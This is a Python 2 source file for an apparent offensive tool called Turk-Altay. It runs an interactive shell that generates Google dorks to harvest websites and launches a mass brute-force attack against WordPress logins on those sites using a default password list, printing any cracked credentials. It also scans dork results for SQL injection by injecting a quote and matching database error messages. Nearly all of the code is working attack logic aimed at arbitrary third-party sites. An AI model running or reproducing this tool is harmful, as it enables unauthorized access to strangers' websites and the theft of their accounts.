#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "16.04.2017"

try:
	__version__ = open("version.txt", "r").read()
except:
	__version__ = "1.5.0"

import os
import sys
import time
import urllib2

from source import dorkMaker
from source import dorkScanner
from source import bruteForce

from colorama import Fore, Back, Style, init

red     = Fore.RED
cyan    = Fore.CYAN
blue    = Fore.BLUE
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT

sqliErrors = {
			 "error in your SQL syntax": 'SQL syntax error',
			 "Query failed": 'Query failed',
			 "supplied argument is not a valid MySQL result resource in": 'Bad argument',
			 "Microsoft JET Database Engine error '80040e14'": 'JET DBE error',
			 "Error:unknown": 'Unknown error',
			 "Fatal error": 'Fatal error',
			 "mysql_fetch": 'MySQL fetch',
			 "Syntax error": 'Syntax error'
			}

def versionControl(version):
	control = urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/Turk-Altay/master/version.txt").read().strip()

	if control != version:
		print yellow + bright + "\n[*] New version available, please update! %s ==> %s"%(version, control)


def logo():
	print bright + red + """
___________            __                _____  .__   __                
\__    ___/_ _________|  | __           /  _  \ |  |_/  |______  ___.__.
  |    | |  |  \_  __ \  |/ /  ______  /  /_\  \|  |\   __\__  \<   |  |
  |    | |  |  /|  | \/    <  /_____/ /    |    \  |_|  |  / __ \\___   |
  |____| |____/ |__|  |__|_ \         \____|__  /____/__| (____  / ____|
                           \/                 \/               \/\/     

\t\t\t\t\t%sVersion 1.0.0
\t\t\t\t\tBlack Viking - Keylo99
\t\t\t\t\thttp://github.com/blackvkng"""%(cyan)

def help():
	help = bright + blue + """
\tCommands:

\t\tTurk-Altay Commands:

\t\t\thelp\t\t\t: Show this message.
\t\t\tclear\t\t\t: Clear the screen.
\t\t\texit\t\t\t: Exit from program.

\t\tWordPress Brute Force:

\t\t\tgenerate dork 15\t: Generate 15 dork, with random words.
\t\t\tscan dorks 5\t\t: Find 5 site for a dork (~25 site with 5 dork)
\t\t\tshow passwords\t\t: Show default passwords.
\t\t\tshow dorks\t\t: Show generated dorks.
\t\t\tshow sites\t\t: Show found sites from dorks.
\t\t\tstart\t\t\t: Start to brute!

\t\tSQLi Scanner:

\t\t\tsqli scan DORK NUM\t: Scan dork on Google to find SQLi vulnerable sites(Max NUM site).


"""	
	print help

def clear():
	if os.name == "nt": os.system("cls")
	else: os.system("clear")

def main():
	global dorks, sites

	while True:
		altay = raw_input(bright + green + "\naltay => ").lower()

		if altay == "help":
			help()

		elif altay == "exit":
			sys.exit()

		elif altay == "clear":
			clear()

		elif "sqli scan" in altay:
			altay = altay.split(" ")

			if len(altay) < 4:
				print yellow + bright + "[-] Example usage: sqli scan DORK NUM"
				main()

			dork = ' '.join(altay[2:-1])
			num  = altay[-1]

			sqliSites = []

			dorkScanner.sites = []

			print "[*] Dork \t:", dork
			print "[*] Number \t:", num

			dorkScanner.getSites(dork, num)

			if len(dorkScanner.sites) != 0:
				print bright + yellow + "\n[+] Found %s site!"%(len(dorkScanner.sites))
				print bright + green + "[+] SQLi scan started..."

				for url in dorkScanner.sites:
					try:
						source = urllib2.urlopen(url + "'", timeout=5).read()

						for err in sqliErrors:
							if err in source:
								if url not in sqliSites:
									sqliSites.append(url)
									print "- %s%s %s--> %s%s"%(bright + blue, url, red, yellow, sqliErrors[err])
					except Exception as e:
						#print bright + red + "Error: ", e
						pass



		elif altay == "show passwords":
			print "-"*60
			for pwd in bruteForce.passwords:
				print bright + cyan + "  "+pwd
			print "-"*60
			print bright + yellow + "[*] There are %s password!"%(len(bruteForce.passwords))


		elif "generate dork" in altay:
			try:
				num = int(altay.split()[-1])
			except ValueError:
				print bright + yellow + "[-] Example Usage: generate dork 5"
				main()

			dorkMaker.dorks = [] # ^^
			dorkMaker.generateDork(num)
			print bright + yellow + "[*] Generated %s dork!"%(len(dorkMaker.dorks))

		elif altay == "show dorks":
			if len(dorkMaker.dorks) != 0:
				print "-"*60
				for dork in dorkMaker.dorks:
					print bright + cyan + "  "+dork
				print "-"*60
				print bright + yellow + "[*] There are %s dork!"%(len(dorkMaker.dorks))
			
			else:
				print bright + yellow + "[-] No dorks to show!"


		elif "scan dorks" in altay:
			try:
				num = int(altay.split()[-1])
			except ValueError:
				print bright + yellow + "[-] Example Usage: scan dorks 5"
				main()

			if len(dorkMaker.dorks) != 0:
				dorkScanner.sites = [] #^^
				print bright + yellow + "\n[*] Scan started!"
				forBar = 0
				barLen = 50.0
				for dork in dorkMaker.dorks:
					sys.stdout.write(bright + magenta + "\r[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
					sys.stdout.flush()
					dorkScanner.getSites(dork, num)
					forBar += barLen / len(dorkMaker.dorks)
				print bright + green + "\r[%s | 100%%]"%("="*50)
				
				print bright + yellow + "\n[+] Found %s site!"%(len(dorkScanner.sites))

			else:
				print bright + yellow + "[-] No dorks to scan!"

		elif altay == "show sites":
			if len(dorkScanner.sites) != 0:
				print "-"*60
				for site in dorkScanner.sites:
					print bright + cyan + "  "+site
				print "-"*60
				print bright + yellow + "[*] There are %s site!"%(len(dorkScanner.sites))

			else:
				print bright + yellow + "[-] No sites to show!"

		elif altay == "start":
			if len(dorkScanner.sites) != 0:
				test             = 0
				forBar           = 0
				barLen           = 50.0
				startTime		 = time.time()
				bruteForce.found = []
				print green + "[+] Brute force attack started!"
				print bright + yellow + "[+] Check %s for found sites!\n"%(os.getcwdu()+os.sep+"found.txt")
				for site in dorkScanner.sites:
					sys.stdout.write(bright + magenta + "\r[%s%s | %d%% | Found : %s | Tested: %s/%s ] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2), len(bruteForce.found), test, len(dorkScanner.sites), ))
					sys.stdout.flush()
					bruteForce.brute(site)
					forBar += barLen / len(dorkScanner.sites)
					test   += 1
				print bright + green + "\r[%s | 100%% | Found sites: %s | Tested: %s/%s]"%("="*50, len(bruteForce.found), len(dorkScanner.sites), len(dorkScanner.sites))

				found = bruteForce.found
				if len(found) != 0:
					for f in found:
						print green + "\n[+] Site: %s"%(f[0])
						print green + "    [+] Username: %s"%(f[1])
						print green + "    [+] Password: %s"%(f[2])
				else:
					print bright + yellow + "\n[-_-] I could not find anything."

			else:
				print bright + yellow + "[-] No sites to brute!"

		else:
			pass

if __name__ == "__main__":
	init(autoreset=True)
	logo()
	versionControl(__version__)
	main()
